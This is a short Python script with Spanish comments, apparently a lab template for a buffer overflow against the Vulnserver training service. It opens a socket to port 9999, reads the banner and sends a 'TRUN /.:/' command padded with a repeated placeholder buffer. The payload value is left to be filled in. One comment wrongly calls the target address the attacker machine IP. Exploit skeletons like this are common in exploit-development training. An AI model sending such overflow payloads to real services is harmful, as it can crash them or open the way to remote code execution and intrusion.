#!/usr/bin/python3
import sys
import socket

ip = "192.168.0.39" # CHANGE THIS - put your attacker machine IP here
port = 9999

buffer = b"COLOCA EL VALOR AQUI" * 100

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)  # Timeout de 5 segundos
    print(f"[*] Conectando a {ip}:{port}")
    sock.connect((ip, port))
    print("[*] Conexión exitosa")
    banner = sock.recv(1024)
    print(f"[*] Banner: {banner}")
    payload = b'TRUN /.:/' + buffer
    sock.send(payload)
    print("[*] Payload enviado")
    sock.close()
except socket.timeout:
    print("[-] Timeout - el puerto no responde")
except ConnectionRefusedError:
    print("[-] Conexión rechazada - el servicio no está corriendo en ese puerto")
except Exception as e:
    print(f"[-] Error: {e}")


